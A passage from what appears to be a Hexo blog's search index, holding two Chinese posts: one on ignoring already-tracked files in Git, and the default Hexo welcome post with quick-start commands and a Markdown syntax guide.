.gitignore只能忽略那些原来没有被track的文件，如果某些文件已经被纳入了版本管理中，则修改.gitignore是无效的。 正确的做法是在每个clone下来的仓库中手动设置不要检查特定文件的更改情况。 1 git update-index --assume-unchanged PATH // 在PATH处输入要忽略的文件。 另外 git 还提供了另一种 exclude 的方式来做同样的事情，不同的是 .gitignore 这个文件本身会提交到版本库中去。用来保存的是公共的需要排除的文件。而 .git/info/exclude 这里设置的则是你自己本地需要排除的文件。 他不会影响到其他人。也不会提交到版本库中去。 .gitignore 还有个有意思的小功能， 一个空的 .gitignore 文件 可以当作是一个 placeholder 。当你需要为项目创建一个空的 log 目录时， 这就变的很有用。 你可以创建一个 log 目录 在里面放置一个空的 .gitignore 文件。这样当你 clone 这个 repo 的时候 git 会自动的创建好一个空的 log 目录了。]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>.gitignore</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hello-world]]></title>
    <url>%2Fblob%2F1989-01-01-hello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1 $ hexo new "My New Post " More info: Writing Run server 1 $ hexo server More info: Server Generate static files 1 $ hexo generate More info: Generating Deploy to remote sites 1 $ hexo deploy More info: Deployment Tables Are Cool col 3 is right-aligned $1600 Front-matter Front-matter 是文件最上方以 — 分隔的区域，用于指定个别文件的变量，举例来说： 123 title: Hello Worlddate: 2013/7/13 20:46:25--- 以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。 参数 描述 默认值 layout 布局 title 标题 date 建立日期 文件建立日期 updated 更新日期 文件更新日期 comments 开启文章的评论功能 true tags 标签（不适用于分页） categories 分类（不适用于分页） permalink 覆盖文章网址 &nbsp; 分类和标签 只有文章支持分类和标签，您可以在 Front-matter 中设置。 Markdown语法的简要规则 标题 标题是每篇文章都需要也是最常用的格式，在 Markdown 中，如果一段文字被定义为标题，只要在这段文字前加 # 号即可。会生成右侧的目录树，同时以不同的字体大小并加粗显示。 12345 # 一级标题## 二级标题### 三级标题 以此类推，总共六级标题，建议在井号后加一个空格，这是最标准的 Markdown 语法。 列表 列表的显示只需要在文字前加上 - 或 * 即可变为无序列表，有序列表则直接在文字前加1. 2. 3. 符号要和文字之间加上一个字符的空格。 无序列表 123 * 1* 2* 3 to： 1 2 3 有序列表 123 1. 12. 23. 3 to： 1 2 3 引用 如果你需要引用一小段别处的句子，那么就要用引用的格式。只需要在文本前加入 &gt; 这种尖括号（大于号）即可。 123 &gt; 这里是引用要注意符号和文本间的空格 to： 这里是引用 要注意符号和文本间的空格 图片和链接 插入链接与插入图片的语法很像，区别在一个 !号 1234567891011 图片为：![]()链接为：[]()![BURBERRY](/images/BURBERRY.png)[Baidu](https://www.baidu.com)[BURBERRY][1][1]: https://www.baidu.com to： Baidu BURBERRY 粗体与斜体 用两个 包含一段文本就是粗体的语法，用一个 包含一段文本就是斜体的语法。 12 **这里是粗体***这里是斜体* to：这里是粗体这里是斜体 表格 12345 | Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | $1600 || col 2 is | centered | $12 || zebra stripes | are neat | $1 | 这种语法生成的表格如下： Tables Are Cool col 3 is right-aligned $1600 col 2 is centered $12 zebra stripes are neat $1 代码框 程序员需要在文章中引用代码框，需要使用`把中间代码包裹起来，或者一个在代码前面加一个tab。 1234567891011 ` ``代码片段，前后各加三个注意实际使用中没用空格，为了显示才加的空格` ```代码元素，前后只有一个` let a; let b; //在前面加tab to： 1 代码片段，前后各加三个 代码元素，前后只有一个 let a; let b; //在前面加tab 分割线 1 *** to： 参考 解决gitment无法登陆评论问题（Object ProgressEvent）https://blog.csdn.net/wardseptember/article/details/82828391 Gitment：使用 GitHub Issues 搭建评论系统https://imsun.net/posts/gitment-introduction/https://github.com/settings/applications/new https://www.jianshu.com/p/57afa4844aaahttps://blog.csdn.net/FlowerDance17/article/details/80685112]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
</search>
